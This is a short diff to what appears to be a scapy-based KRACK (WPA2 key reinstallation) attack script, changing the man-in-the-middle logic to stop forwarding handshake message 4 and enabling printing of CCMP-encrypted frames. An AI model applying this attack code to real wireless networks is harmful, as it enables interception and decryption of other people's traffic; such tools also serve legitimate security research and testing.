@@ -171,7 +171,7 @@ class ClientState():
 			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
 				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
 				# 四次交握不轉送 msg4
-				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 4) or (p.type == 0 and p.subtype == 13)
+				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) or (p.type == 0 and p.subtype == 13)
 			return self.state in [ClientState.Success_Reinstalled]
 
 	def save_iv_keystream(self, iv, keystream):
@@ -353,8 +353,8 @@ class KRAckAttack():
 
 			client.save_iv_keystream(iv, keystream)
 
-		# elif p.haslayer(Dot11CCMP):
-			# print(p.show())
+		elif p.haslayer(Dot11CCMP):
+			print(p.show())
 
 	def handle_to_client_groupkey(self, client, p):
 		if not args.group: return False
